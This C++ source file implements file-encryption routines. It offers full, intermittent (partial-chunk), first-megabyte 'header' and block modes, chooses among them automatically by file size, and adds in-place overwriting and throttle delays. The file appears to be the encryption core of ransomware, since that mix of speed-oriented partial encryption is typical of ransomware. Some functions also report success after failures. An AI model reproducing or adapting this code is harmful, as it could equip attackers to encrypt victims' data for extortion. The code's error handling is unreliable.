#include "filesystem.h"
#include <thread>

bool filesystem::WriteFullData
(
	DESC hFile,
	LPVOID Buffer,
	unsigned Size
)
{
	DWORD TotalWritten = 0;
	size_t BytesWritten = 0;
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{
		if (!api::WriteFile(hFile, (BYTE*)Buffer + Offset, BytesToWrite, &BytesWritten) || !BytesWritten)
		{
			return FALSE;
		}

		Offset += BytesWritten;
		TotalWritten += BytesWritten;
		BytesToWrite -= BytesWritten;
	}

	return TRUE;
}

static bool EncryptFileFullData(PFILE_INFO FileInfo)
{
	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
	size_t written = 0;
	DWORD BytesRead = FileInfo->filesize;
	size_t dwread = 0;
	DWORD padding = 0;
	bool isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
	if (isAes && FileInfo->dcrypt == (int)EncryptCipher::CRYPT)
		padding = aes256_padding(BytesRead) - BytesRead;
		

	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + AES_BLOCK_SIZE);
	if (!FileBuffer)
	{
		LOG_ERROR("[EncryptFileFullData] Large File Size. Buffer heap crash; %s", FileInfo->filename);
		goto end;
	}

	if (!api::ReadFile(FileInfo->filehandle, FileBuffer, BytesRead, &dwread))
	{
		LOG_ERROR("[EncryptFileFullData] File is failed to ReadFile; %s", FileInfo->filename);
		goto end;
	}

	FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, dwread);

	if(isAes && FileInfo->dcrypt == (int)EncryptCipher::DECRYPT)
	{
		memory::memzero_explicit(&FileBuffer[FileInfo->filesize - FileInfo->padding], FileInfo->padding);
		FileInfo->filesize -= FileInfo->padding;
		BytesRead -= FileInfo->padding;
	}

	if(GLOBAL_STATE.g_write_in &&
		(!api::SetPointOff(FileInfo->recent_filehandle, 0, SEEK_SET) &&
		!api::WriteFile(FileInfo->recent_filehandle, FileBuffer, BytesRead + padding, &written)))
	{
		LOG_ERROR("[EncryptFileFullData] failed;");
		goto end;
	}
	else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, FileBuffer, BytesRead + padding))
	{
		LOG_ERROR("[EncryptFileFullData] File is failed to write; %s", FileInfo->filename);
		goto end;
	}

	if(sleep_time > 0)
		std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));

	success = TRUE;
end:
	if (FileBuffer) memory::m_free(FileBuffer);
	return TRUE;
}


static bool EncryptFilePartly
(
	PFILE_INFO FileInfo,
	BYTE DataPercent
)
{
	if (FileInfo->filesize < 300)
	{
		LOG_ERROR("[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: " log_str, FileInfo->filename);
		return FALSE;
	}
	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
	size_t written = 0;
	size_t total_write = 0;
	DWORD multiply = 0;
	size_t BytesRead;
	size_t BytesReadW;
	LONGLONG TotalRead;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	int StepsCount = 0;
	LONGLONG Size = FileInfo->filesize;

	switch (DataPercent)
	{
	case 20:
		PartSize = (Size / 100) * 7;
		StepsCount = 3;
		StepSize = (Size - (PartSize * 3)) / 2;
		break;

	case 50:
		PartSize = (Size / 100) * 10;
		StepsCount = 5;
		StepSize = PartSize;
		break;

	default:
		return FALSE;
	}

	BOOL isAes = FileInfo->crypt_info->method_policy == CryptoPolicy::AES256
		|| FileInfo->crypt_info->method_policy == CryptoPolicy::RSA_AES256;
	
	if (isAes)
			multiply = PartSize % 16;
	

	BYTE* BufferPart = (BYTE*)memory::m_malloc(PartSize);
	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
	if (!BufferPart || !BufferStep)
	{
		LOG_ERROR("[EncryptFilePartly] Large File Size. Buffer heap crash; " log_str, FileInfo->filename);
		return FALSE;
	}

	for (int i = 0; i < StepsCount; ++i)
	{
		if (!api::ReadFile(FileInfo->filehandle, BufferPart, PartSize, &BytesRead) || !BytesRead)
		{
			LOG_ERROR("[EncryptFilePartly] Failed File to Read Data; " log_str, FileInfo->file_path);
			goto end;
		}

		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
	
		if(GLOBAL_STATE.g_write_in)
		{
			if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
				!api::WriteFile(FileInfo->recent_filehandle, BufferPart, BytesRead, &written))
				{
					LOG_ERROR("[EncryptFilePartly] failed;");
					goto end;
				}
			total_write += BytesRead;
		}
		else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, BufferPart, BytesRead))
		{
			LOG_ERROR("[EncryptFilePartly] Failed File to Write data; " log_str, FileInfo->file_path);
			goto end;
		}
		TotalRead = 0;
		while (TotalRead < StepSize)
		{
			if (!api::ReadFile(FileInfo->filehandle, BufferStep, StepSize, &BytesReadW) || !BytesReadW)
				break;
			if(GLOBAL_STATE.g_write_in)
			{
				if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
				!api::WriteFile(FileInfo->recent_filehandle, BufferStep, BytesReadW, &written))
					break;		
			}
			else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, BufferStep, BytesReadW))
				break;
			TotalRead += BytesReadW;
			total_write += BytesReadW;

			if(sleep_time > 0)
				std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
		}
	}

	success = TRUE;

end:
	if (BufferPart)
		memory::m_free(BufferPart);
	if (BufferStep)
		memory::m_free(BufferStep);

	return success;
}

static bool EncryptFileBlock
(
	PFILE_INFO FileInfo
)
{
	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
	size_t BytesRead;
	size_t total_write = 0;
	size_t written = 0;
	u32 padding = 0;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE);

	while (api::ReadFile(FileInfo->filehandle, Buffer, 1048576, &BytesRead) && BytesRead != 0)
	{
		if (BytesRead < 1048576)
		{
			if(FileInfo->crypt_info->method_policy == CryptoPolicy::AES256)
			{
				padding = BytesRead % 16;
				BytesRead -= padding;
			}
		}

		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);

		if(GLOBAL_STATE.g_write_in)
		{
			if(!api::SetPointOff(FileInfo->recent_filehandle, total_write, SEEK_SET) || 
				!api::WriteFile(FileInfo->recent_filehandle, Buffer, BytesRead, &written))
				{
					LOG_ERROR("[EncryptFileBlock] failed;");
					goto end;
				}
			total_write += written;
		}
		else if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead + padding))
		{
			LOG_ERROR("[EncryptFileBlock] [WriteFullData] Failed");
			goto end;
		}

		if(sleep_time > 0)
			std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
	}

	success = TRUE;
end:
	memory::m_free(Buffer);
	return TRUE;
}

static bool EncryptFileHeader
(
	PFILE_INFO FileInfo
)
{
	if (FileInfo->filesize < 1048576)
	{
		LOG_ERROR("[EncryptFileHeader] FileSize must be > 1.0 MB; " log_str, FileInfo->filename);
		return FALSE;
	}

	BOOL success = FALSE;
	size_t sleep_time = static_cast<size_t>(GLOBAL_ENUM.g_throttle_time);
	DWORD BytesEncrypt = 1048576;
	size_t BytesRead;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
	if (!Buffer)
	{
		LOG_ERROR("Heap Crash");
		return FALSE;
	}
	if (!api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) || BytesRead != BytesEncrypt)
	{
		LOG_ERROR("[EncryptFileHeader] Failed ReadFile; " log_str, FileInfo->filename);
		goto end;
	}

	FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
	
	if(GLOBAL_STATE.g_write_in)
	{
		size_t written = 0;
		if(!api::SetPoint(FileInfo->recent_filehandle, SEEK_SET) || 
			!api::WriteFile(FileInfo->recent_filehandle, Buffer, BytesEncrypt, &written))
			{
				LOG_ERROR("[EncryptFileHeader] failed;");
				goto end;
			}
	}
	else
	{
		if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesEncrypt))
		{
			LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
			goto end;
		}

		while (api::ReadFile(FileInfo->filehandle, Buffer, BytesEncrypt, &BytesRead) && BytesRead != 0)
		{
			if (!filesystem::WriteFullData(FileInfo->recent_filehandle, Buffer, BytesRead))
			{
				LOG_ERROR("[EncryptFileHeader] [WriteFullData] failed");
				goto end;
			}

			if(sleep_time > 0)
				std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));

		}
	}

	success = TRUE;

end:
	memory::m_free(Buffer);
	return success;
}

bool filesystem::OptionEncryptModeAUTO(PFILE_INFO FileInfo)
{
	if (FileInfo->filesize <= 1048576)
	{
		if (!EncryptFileFullData(FileInfo))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->filename);
			return FALSE;
		}
	}
	else if (FileInfo->filesize <= 5242880)
	{
		if (!EncryptFilePartly(FileInfo, 20))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->filename);
			return FALSE;
		}
	}
	else
	{
		if (!EncryptFileHeader(FileInfo))
		{
			LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->filename);
			return FALSE;
		}
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeFULL(PFILE_INFO FileInfo)
{
	if (!EncryptFileFullData(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileFullData]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModePARTLY(PFILE_INFO FileInfo)
{
	if (!EncryptFilePartly(FileInfo, 20))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFilePartly]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeHEADER(PFILE_INFO FileInfo)
{
	if (!EncryptFileHeader(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileHeader]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}

bool filesystem::OptionEncryptModeBLOCK(PFILE_INFO FileInfo)
{
	if (!EncryptFileBlock(FileInfo))
	{
		LOG_ERROR("[OptionEncryptMode] Failed to [EncryptFileBlock]; " log_str, FileInfo->filename);
		return FALSE;
	}

	return TRUE;
}